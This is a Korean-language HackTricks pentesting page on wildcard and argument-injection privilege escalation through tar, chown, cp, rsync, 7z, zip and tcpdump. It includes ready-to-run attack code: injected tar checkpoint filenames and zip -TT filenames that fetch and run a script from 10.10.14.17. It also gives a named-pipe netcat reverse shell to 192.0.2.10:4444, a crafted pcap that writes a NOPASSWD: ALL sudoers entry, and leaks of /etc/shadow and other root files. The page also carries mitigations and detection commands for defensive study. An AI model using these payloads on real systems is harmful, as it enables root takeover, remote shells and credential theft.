# 와일드카드 추가 기법

{{#include ../../banners/hacktricks-training.md}}

> 와일드카드(일명 *glob*) **argument injection**은 권한이 높은 스크립트가 `tar`, `chown`, `rsync`, `zip`, `7z` 등의 Unix 바이너리를 따옴표로 묶지 않은 `*` 같은 와일드카드와 함께 실행할 때 발생합니다.  
> 셸은 바이너리를 실행하기 **전에** 와일드카드를 확장하므로, 작업 디렉터리에 파일을 만들 수 있는 공격자는 `-`로 시작하는 파일명을 만들어 해당 파일명이 데이터가 아닌 **옵션으로 해석되도록** 할 수 있습니다. 이렇게 임의의 플래그나 명령까지 몰래 끼워 넣을 수 있습니다.<sup>[[6]](#references)</sup>  
> 이 페이지에서는 2023~2025년의 가장 유용한 기본 기법, 최신 연구 및 최신 탐지 방법을 정리합니다.

## chown / chmod

와일드카드로 확장되는 옵션처럼 보이는 파일명을 악용해 `--reference` 플래그를 사용하면 **기준 파일의 소유자/그룹 또는 권한 비트를 복사**할 수 있습니다.<sup>[[6]](#references)[[8]](#references)[[9]](#references)</sup>

```bash
# attacker-controlled directory
touch -- .drf.php
chmod 777 -- .drf.php
touch -- "--reference=.drf.php"   # ← filename becomes an argument
```

나중에 root가 다음과 같은 명령을 실행하면:

```bash
chown -R alice:alice *.php
chmod -R 644 *.php
```

확장된 `--reference=.drf.php`가 명시된 소유자/모드를 덮어써, 일치하는 파일이 `.drf.php`의 메타데이터를 상속하게 됩니다(위 설정에서는 공격자가 해당 파일에 쓰기도 가능해집니다).<sup>[[6]](#references)</sup>

privileged helper 전체를 검토하세요. `chown` 행만 보지 마세요. 소유권 변경으로 set-user-ID 또는 set-group-ID 비트가 지워질 수 있으며, [POSIX는 privileged case의 동작을 구현 정의로 둡니다](https://pubs.opengroup.org/onlinepubs/9699919799.2013edition/functions/chown.html). 같은 job에서 나중에 실행되는 `chmod`가 앞서 선택된 파일의 해당 비트를 복원해 결과를 바꿀 수 있습니다. 이를 실행 가능한 privilege 경로로 판단하기 전에 실제 명령 순서, 쓰기 가능한 glob 디렉터리, 영향을 받는 파일과 링크의 동작, 최종 소유자와 모드, 그리고 mount가 set-user-ID를 적용하는지 확인하세요. helper를 읽을 수 없으면 이 단계들은 확인할 수 없습니다.

*PoC & tool*: [`wildpwn`](https://github.com/localh0t/wildpwn) (결합 공격).<sup>[[7]](#references)</sup>
자세한 내용은 고전적인 DefenseCode 논문도 참조하세요.<sup>[[6]](#references)</sup>

---

## privileged script의 GNU `cp`

낮은 권한의 사용자가 해당 디렉터리에 파일명을 만들 수 있을 때, 호출자가 선택한 작업 디렉터리에서 단순 glob을 사용해 복사하는 root 실행 스크립트를 검토하세요. 예: `cp .version * /etc/app/staged/`. GNU `cp`는 `*`로 확장된 하이픈으로 시작하는 파일명을 옵션으로 해석할 수 있습니다. `--preserve=mode` 옵션은 새 복사본에 원본의 mode 비트를 유지할 수 있고, `--target-directory`는 복사 대상 디렉터리를 바꿀 수 있습니다. 어느 쪽이든 정확한 스크립트 분기, 대상의 상태, 유효 권한, 파일시스템 정책, GNU `cp`의 동작을 확인해야 합니다. sudo 규칙이나 스크립트의 텍스트만으로는 권한 상승이 입증되지 않습니다. 피연산자 앞에 `./`를 붙이거나 `--`로 옵션 파싱을 종료하면 GNU `cp`가 하이픈으로 시작하는 파일명을 옵션으로 해석하는 것을 막을 수 있습니다([GNU Coreutils FAQ](https://www.gnu.org/software/coreutils/faq/coreutils-faq.html), [`cp` 매뉴얼](https://www.gnu.org/software/coreutils/manual/html_node/cp-invocation.html)).

---

## tar

### GNU tar

GNU tar의 **checkpoint** 기능과 checkpoint actions를 악용해 임의 명령을 실행합니다.<sup>[[10]](#references)</sup>

```bash
# attacker-controlled directory
echo 'echo pwned > /tmp/pwn' > shell.sh
chmod +x shell.sh
touch -- "--checkpoint=1"
touch -- "--checkpoint-action=exec=sh shell.sh"
```

Once root가 예를 들어 `tar -czf /root/backup.tgz *`를 실행하면 `shell.sh`가 root 권한으로 실행됩니다.<sup>[[10]](#references)</sup>

### bsdtar / macOS compressor override 관련 주의사항

최근 macOS의 기본 `tar`(`libarchive` 기반)는 GNU tar의 `--checkpoint` 인터페이스를 제공하지 않지만, bsdtar는 외부 compressor를 선택하는 **--use-compress-program**을 문서화하고 있습니다.<sup>[[11]](#references)</sup>

```bash
# macOS example
touch -- "--use-compress-program=sh"
```
권한이 상승된 스크립트에서 `tar -cf backup.tar *`를 실행하면, victim의 `PATH`를 통해 `sh`가 선택되고 bsdtar가 이를 compressor로 시작합니다.<sup>[[11]](#references)</sup> 이는 option injection을 입증하지만, 이것만으로 신뢰할 수 있는 arbitrary-command primitive가 되는 것은 아닙니다. 와일드카드로 생성된 파일명에는 `/`를 포함할 수 없고, bsdtar는 공격자가 선택한 셸 명령이 아니라 archive 데이터를 전달합니다. 코드를 실행하려면 추가로 `PATH`를 통해 해석되는 제어 가능한 실행 파일이나, 유용한 프로그램을 지정할 수 있는 다른 인자 채널이 필요합니다.

---

## rsync

`rsync`에서는 `-e` 및 `--rsync-path` 같은 명령줄 플래그를 통해 원격 셸이나 원격 바이너리를 재정의할 수 있습니다.<sup>[[12]](#references)</sup>

```bash
# attacker-controlled directory
touch -- "-e sh shell.sh"        # -e <cmd> => use <cmd> instead of ssh
```

root가 나중에 `rsync -az * backup:/srv/`로 디렉터리를 아카이브하면, 주입한 flag를 통해 remote-shell 메커니즘으로 shell을 실행할 수 있습니다.<sup>[[7]](#references)[[12]](#references)</sup>

*PoC*: [`wildpwn`](https://github.com/localh0t/wildpwn) (`rsync` 모드).

---

## 7-Zip / 7z / 7za

권한이 있는 script가 option parsing을 막기 위해 wildcard 앞에 `--`를 *방어적으로* 붙이더라도, 7-Zip CLI는 파일명 앞에 `@`를 붙여 **file list files**를 사용할 수 있습니다. 여기에 symlink를 결합하면 *임의 파일을 exfiltrate*할 수 있습니다.<sup>[[13]](#references)</sup>

```bash
# directory writable by low-priv user
cd /path/controlled
ln -s /etc/shadow   root.txt      # file we want to read
touch @root.txt                  # tells 7z to use root.txt as file list
```

root가 다음과 같은 명령을 실행하면:

```bash
7za a /backup/`date +%F`.7z -t7z -snl -- *
```

7-Zip은 `root.txt` (→ `/etc/shadow`)를 파일 목록으로 읽으려 시도하고, 실패하면서 **내용을 stderr에 출력합니다**.<sup>[[13]](#references)</sup>

이는 `-- *`를 사용해도 우회되지 않습니다. 7-Zip CLI는 일반 파일 이름과 `@listfiles`를 모두 위치 인수로 명시적으로 허용하므로, `@root.txt`와 같은 리터럴 파일 이름도 여전히 특별하게 처리됩니다.<sup>[[13]](#references)</sup>

---

## zip

애플리케이션이 사용자 제어 파일 이름을 `zip`에 전달할 때(와일드카드를 사용하거나 `--` 없이 이름을 열거하는 경우), 매우 실용적인 primitive 두 가지를 사용할 수 있습니다.<sup>[[2]](#references)[[3]](#references)</sup>

- 테스트 hook을 통한 RCE: `-T`는 “test archive”를 활성화하고, `-TT <cmd>`는 tester를 임의의 프로그램으로 대체합니다(긴 형식: `--unzip-command <cmd>`). `-`로 시작하는 파일 이름을 삽입할 수 있다면, short-option 파싱이 작동하도록 각 플래그를 서로 다른 파일 이름으로 나누세요.<sup>[[2]](#references)[[3]](#references)</sup>

```bash
# Attacker-controlled filenames (e.g., in an upload directory)
# 1) A file literally named: -T
# 2) A file named: -TT wget 10.10.14.17 -O s.sh; bash s.sh; echo x
# 3) Any benign file to include (e.g., data.pcap)
# When the privileged code runs: zip out.zip <files...>
# zip will execute: wget 10.10.14.17 -O s.sh; bash s.sh; echo x
```

메모
- `'-T -TT <cmd>'`처럼 단일 파일 이름을 사용하지 마세요. 짧은 옵션은 문자별로 파싱되므로 실패합니다. 표시된 대로 별도의 토큰을 사용하세요.<sup>[[3]](#references)</sup>
- 앱이 파일 이름에서 슬래시를 제거한다면, 기본 경로 `/index.html`을 사용하는 베어 호스트/IP에서 가져와 `-O`로 로컬에 저장한 다음 실행하세요.<sup>[[3]](#references)</sup>
- 토큰이 어떻게 처리되는지 확인하려면 `-sc`(처리된 argv 표시) 또는 `-h2`(추가 도움말)를 사용해 파싱을 디버깅할 수 있습니다.<sup>[[3]](#references)</sup>

예시(zip 3.0의 로컬 동작).<sup>[[3]](#references)</sup>

```bash
zip test.zip -T '-TT wget 10.10.14.17/shell.sh' test.pcap    # fails to parse
zip test.zip -T '-TT wget 10.10.14.17 -O s.sh; bash s.sh' test.pcap  # runs wget + bash
```

- Data exfil/leak: 웹 계층에서 `zip`의 stdout/stderr를 그대로 출력하는 경우(naive wrapper에서 흔함), `--help` 같은 injected flag나 잘못된 옵션으로 인한 오류가 HTTP 응답에 표시됩니다. 이를 통해 command-line injection을 확인하고 payload를 조정하는 데 도움이 됩니다.<sup>[[3]](#references)</sup>

---

## 추가 option-injection 후보

권한이 있는 wrapper가 writable directory를 wildcard로 확장하는 경우, 문서화된 다음 option hook을 확인해 볼 만합니다.<sup>[[15]](#references)[[16]](#references)[[17]](#references)</sup>

| Binary | 악용할 Flag | 효과 |
| --- | --- | --- |
| `flock` | `-c <cmd>` | 명령 문자열을 shell에 전달 |
| `git`   | `-c core.sshCommand=<cmd>` | Git fetch/push 시 SSH 대신 `<cmd>` 사용 |
| `scp`   | `-S <program>` | 대체 SSH 호환 연결 프로그램 사용 |

이러한 primitive는 고전적인 *tar/rsync/zip* 외에도 유용하게 확인할 수 있습니다.

---

## 취약한 wrapper와 job 찾기

최근 사례 연구와 탐지 지침에 따르면 wildcard/argv injection은 더 이상 **cron + tar** 문제에만 국한되지 않습니다.<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup> 같은 종류의 버그가 다음 환경에서도 계속 발견됩니다.

- 공격자가 제어하는 upload directory에서 "download everything as zip/tar" 기능을 제공하는 웹 기능
- 공격자가 제어하는 filename/filter 필드를 받는 **tcpdump** wrapper를 노출하는 vendor/appliance debug shell
- writable directory에서 `tar`, `rsync`, `7z`, `zip`, `chown` 또는 `chmod`를 실행하는 backup 또는 rotation job

유용한 triage 명령(`pspy` 호출에는 문서화된 process/file-event 및 interval flag가 사용됩니다).<sup>[[14]](#references)</sup>

```bash
# Hunt for interesting binaries fed with globs or positional user data
rg -n --hidden --follow \
  '(tar|bsdtar|rsync|zip|7z|7za|chown|chmod|tcpdump).*(\*|\$@|\$\*)' \
  /etc /opt /usr/local /srv 2>/dev/null

# Watch real argv during cron/systemd execution
pspy64 -pf -i 1000 | rg 'tar|rsync|zip|7z|tcpdump|chown|chmod'

# Sudoers rules that constrain one argument but still allow extra flags
sudo -l
rg -n 'tcpdump|zip|tar|rsync' /etc/sudoers /etc/sudoers.d 2>/dev/null
```

빠른 휴리스틱:

- `-- *`는 많은 GNU 도구에 효과적인 해결책이지만, `@listfiles`는 별도로 파싱되므로 `7z`/`7za`에는 **효과가 없습니다**.<sup>[[13]](#references)</sup>
- `zip`의 경우, 사용자 제어 파일 이름을 직접 나열하는 래퍼를 찾아보세요. 셸 glob이 없어도 짧은 옵션 분리(`-T` + `-TT <cmd>`)는 여전히 작동합니다.<sup>[[2]](#references)[[3]](#references)</sup>
- `tcpdump`의 경우, **출력 파일 이름**, **rotation 설정** 또는 **capture-file replay** 인수를 제어할 수 있게 해주는 래퍼를 특히 주의 깊게 살펴보세요.<sup>[[18]](#references)</sup>

---

## tcpdump rotation hooks (-G/-W/-z): 래퍼의 argv injection을 통한 RCE

제한된 셸이나 벤더 래퍼가 사용자 제어 필드(예: "file name" 매개변수)를 엄격한 quoting/검증 없이 연결해 `tcpdump` 명령줄을 구성하면, 추가 `tcpdump` 플래그를 끼워 넣을 수 있습니다. `-G`(시간 기반 rotation), `-W`(파일 개수 제한), `-z <cmd>`(rotation 후 실행할 명령)를 함께 사용하면 `tcpdump`를 실행하는 사용자 권한으로 임의 명령을 실행할 수 있습니다(어플라이언스에서는 흔히 root).<sup>[[1]](#references)[[4]](#references)[[18]](#references)</sup>

전제 조건:

- `tcpdump`에 전달되는 `argv`를 제어할 수 있어야 합니다(예: `/debug/tcpdump --filter=... --file-name=<HERE>`와 같은 래퍼를 통해).<sup>[[4]](#references)[[18]](#references)</sup>
- 래퍼가 파일 이름 필드의 공백이나 `-`로 시작하는 토큰을 정화하지 않아야 합니다.<sup>[[4]](#references)</sup>

전형적인 PoC(쓰기 가능한 경로의 reverse shell 스크립트를 실행합니다).<sup>[[4]](#references)[[18]](#references)</sup>

```sh
# Reverse shell payload saved on the device (e.g., USB, tmpfs)
cat > /mnt/disk1_1/rce.sh <<'EOF'
#!/bin/sh
rm -f /tmp/f; mknod /tmp/f p; cat /tmp/f|/bin/sh -i 2>&1|nc 192.0.2.10 4444 >/tmp/f
EOF
chmod +x /mnt/disk1_1/rce.sh

# Inject additional tcpdump flags via the unsafe "file name" field
/debug/tcpdump --filter="udp port 1234" \
  --file-name="test -i any -W 1 -G 1 -z /mnt/disk1_1/rce.sh"

# On the attacker host
nc -6 -lvnp 4444 &
# Then send any packet that matches the BPF to force a rotation
printf x | nc -u -6 [victim_ipv6] 1234
```

세부 정보:

- `-G 1`은 매초 파일을 교체하고, `-W 1`은 파일이 한 번 교체된 후 중지합니다. 교체 전에 캡처 대상 패킷이 하나 이상 들어와야 합니다.<sup>[[18]](#references)</sup>
- `-z <cmd>`는 파일이 교체될 때마다 한 번씩 post-rotate 명령을 실행하고, 닫힌 savefile 경로를 인수로 전달합니다. 스크립트/인터프리터의 인수 처리가 payload와 일치하는지 확인하세요.<sup>[[18]](#references)</sup>

이동식 미디어를 사용하지 않는 변형:

- 파일을 쓸 수 있는 다른 primitive(예: 출력 리디렉션을 허용하는 별도의 command wrapper)가 있다면, 알려진 경로에 스크립트를 저장한 뒤 `-z /path/script.sh`를 실행하세요. 필요한 경우 스크립트에서 직접 `/bin/sh`를 호출하세요.<sup>[[18]](#references)</sup>
- vendor wrapper에서 교체되는 경로를 지정할 수 있다면, savefile 인수를 해석하는 post-rotate 명령과 함께 경로 제어 기능을 점검하세요. 경로 제어만으로는 파일 내용이 실행되지 않습니다.<sup>[[18]](#references)</sup>

---

## sudoers: 와일드카드/추가 인수를 사용하는 tcpdump → 임의 파일 쓰기/읽기 및 root 권한

sudoers의 안티패턴 예시:<sup>[[3]](#references)</sup>

```text
(ALL : ALL) NOPASSWD: /usr/bin/tcpdump -c10 -w/var/cache/captures/*/<GUID-PATTERN> -F/var/cache/captures/filter.<GUID-PATTERN>
```

규칙은 tcpdump의 문서화된 파서에서 사용할 수 있는 몇 가지 선택지를 남깁니다:<sup>[[3]](#references)[[18]](#references)</sup>
- `*` glob과 허용적인 패턴은 첫 번째 `-w` 인자에만 제약을 둡니다. `tcpdump`는 여러 `-w` 옵션을 허용하며, 마지막 옵션이 적용됩니다.<sup>[[3]](#references)[[18]](#references)</sup>
- 규칙은 다른 옵션을 제한하지 않으므로 `-Z`, `-r`, `-V` 등을 사용할 수 있습니다.<sup>[[3]](#references)[[18]](#references)</sup>

관련 프리미티브는 아래에 문서화되어 있습니다.<sup>[[3]](#references)[[18]](#references)</sup>
- 두 번째 `-w`로 대상 경로를 덮어씁니다(첫 번째 옵션은 sudoers 조건만 충족).<sup>[[3]](#references)[[18]](#references)</sup>

```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ \
  -w /dev/shm/out.pcap \
  -F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```

- 첫 번째 `-w` 내부의 Path traversal을 통해 제한된 트리에서 벗어납니다.<sup>[[3]](#references)</sup>

```bash
sudo tcpdump -c10 \
  -w/var/cache/captures/a/../../../../dev/shm/out \
  -F/var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```

- `-Z root`로 출력 파일의 소유자를 강제합니다(어디서든 root 소유 파일을 생성).<sup>[[3]](#references)[[18]](#references)</sup>

```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ -Z root \
  -w /dev/shm/root-owned \
  -F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```

- `-r`을 통해 조작된 PCAP을 재생하여 임의 콘텐츠 쓰기(예: sudoers 항목 추가).<sup>[[3]](#references)[[18]](#references)</sup>

<details>
<summary>정확한 ASCII 페이로드가 포함된 PCAP을 생성하고 root 권한으로 기록</summary>

```bash
# On attacker box: craft a UDP packet stream that carries the target line
printf '\n\nfritz ALL=(ALL:ALL) NOPASSWD: ALL\n' > sudoers
sudo tcpdump -w sudoers.pcap -c10 -i lo -A udp port 9001 &
cat sudoers | nc -u 127.0.0.1 9001; kill %1

# On victim (sudoers rule allows tcpdump as above)
sudo tcpdump -c10 -w/var/cache/captures/a/ -Z root \
  -r sudoers.pcap -w /etc/sudoers.d/1111-aaaa \
  -F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```

</details>

- `-V <file>`을 사용한 임의 파일 읽기/secret leak (저장 파일 목록으로 해석함). 오류 진단 메시지는 종종 각 줄을 그대로 출력하여 내용을 leak합니다.<sup>[[3]](#references)[[18]](#references)</sup>

```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ -V /root/root.txt \
  -w /tmp/dummy \
  -F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```

---

## References

- [1] [GTFOBins - tcpdump](https://gtfobins.github.io/gtfobins/tcpdump/)
- [2] [GTFOBins - zip](https://gtfobins.github.io/gtfobins/zip/)
- [3] [0xdf - HTB Dump: Zip 인자 인젝션을 통한 RCE + tcpdump sudo 설정 오류 권한 상승](https://0xdf.gitlab.io/2025/11/04/htb-dump.html)
- [4] [FiberGateway GR241AG - 전체 익스플로잇 체인](https://r0ny.net/FiberGateway-GR241AG-Full-Exploit-Chain/)
- [5] [Elastic - 와일드카드 인젝션을 통한 잠재적 셸 탐지](https://www.elastic.co/guide/en/security/current/prebuilt-rule-8-19-20-potential-shell-via-wildcard-injection-detected.html)
- [6] [미래로 돌아가다: 제멋대로 날뛰는 Unix 와일드카드 (DefenseCode)](https://www.exploit-db.com/papers/33930)
- [7] [wildpwn](https://github.com/localh0t/wildpwn)
- [8] [GNU Coreutils `chown` 호출](https://www.gnu.org/software/coreutils/manual/html_node/chown-invocation.html)
- [9] [GNU Coreutils `chmod` 호출](https://www.gnu.org/software/coreutils/manual/html_node/chmod-invocation.html)
- [10] [GNU tar 체크포인트](https://www.gnu.org/software/tar/manual/html_section/checkpoints.html)
- [11] [bsdtar(1) 설명서](https://man.freebsd.org/cgi/man.cgi?query=bsdtar&sektion=1)
- [12] [rsync(1) 설명서](https://download.samba.org/pub/rsync/rsync.1)
- [13] [7-Zip 명령줄 구문](https://7-zip.opensource.jp/chm/cmdline/syntax.htm)
- [14] [pspy](https://github.com/DominicBreuker/pspy)
- [15] [flock(1) 설명서](https://kernel.googlesource.com/pub/scm/utils/util-linux/util-linux/+/refs/tags/v2.41.1/sys-utils/flock.1.adoc)
- [16] [Git 설정 문서](https://git-scm.com/docs/git-config)
- [17] [OpenBSD `scp` 설명서](https://man.openbsd.org/scp)
- [18] [tcpdump(8) 설명서](https://man7.org/linux/man-pages/man8/tcpdump.8.html)
{{#include ../../banners/hacktricks-training.md}}
